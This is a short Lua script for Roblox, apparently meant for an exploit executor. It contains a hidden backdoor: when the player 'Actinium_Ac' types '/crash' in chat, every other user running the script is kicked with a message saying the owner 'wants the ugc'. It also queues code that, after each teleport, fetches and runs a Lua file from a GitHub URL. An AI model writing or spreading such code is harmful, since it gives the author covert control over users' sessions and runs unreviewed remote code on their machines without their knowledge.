    game:GetService("Players").PlayerAdded:Connect(function(player)
        wait(1)
            game.Players.PlayerAdded:Connect(function(player)
            wait(1)
                player.Chatted:Connect(function(message)
                wait(1)
        if (player.Name == "Actinium_Ac") and message == "/crash" and game.Players.LocalPlayer.UserId ~= 116781531 then
        game.Players.LocalPlayer:Kick("Owner Requested Kick, Owner wants the ugc ;)")
        end
                end)
            end)
        end)
        
        for _, player in ipairs(game.Players:GetPlayers()) do
            player.Chatted:Connect(function(message)
            wait(1)
            if (player.Name == "Actinium_Ac") and message == "/crash" and game.Players.LocalPlayer.UserId ~= 116781531  then
                game.Players.LocalPlayer:Kick("Owner Requested Kick, Owner wants the ugc ;)")
                end
            end)
        end

        queue_on_teleport([[
            if not game:IsLoaded() then game.Loaded:Wait() end
            task.wait(3)
         repeat wait(0.1) until  game.Loaded and game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart") 
                task.wait(7)
           loadstring(game:HttpGet(("https://raw.githubusercontent.com/JustAP1ayer/ignorewtffxd/main/2131.lua"),true))()
           ]])
